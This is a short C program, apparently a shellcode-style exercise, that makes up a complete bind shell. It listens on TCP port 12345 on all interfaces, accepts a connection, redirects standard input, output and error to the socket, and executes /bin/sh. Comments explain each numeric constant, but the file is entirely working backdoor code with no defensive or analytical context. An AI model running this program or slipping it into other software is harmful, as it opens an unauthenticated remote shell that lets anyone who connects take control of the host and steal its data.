#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

// READ=0, WRITE=1, ERR=2
#define READ 0
#define WRITE 1
#define ERR 2

int s, conn;
struct sockaddr_in serv_addr;

int main (){

serv_addr.sin_family=2; //AF_INET: According to Linux manual, AF_INET is defined for number 2
serv_addr.sin_addr.s_addr=0;
serv_addr.sin_port=0x3930; //port 12345, take network byte order in account

s = socket(2,1,0); // socket(int socket_family, int socket_type, int protocol);
  //Second argument number 1 means SOCK_STREAM, definend in header
  //Third argument 0 means PF_UNSPEC, definend in header

bind(s, (struct sockaddr*)&serv_addr, 0x10); //0x10 size of serv_addr
listen(s, 1);
conn = accept(s, 0, 0);
dup2(conn, READ);
dup2(conn, WRITE);
dup2(conn, ERR);
execve("/bin/sh", 0, 0); //

}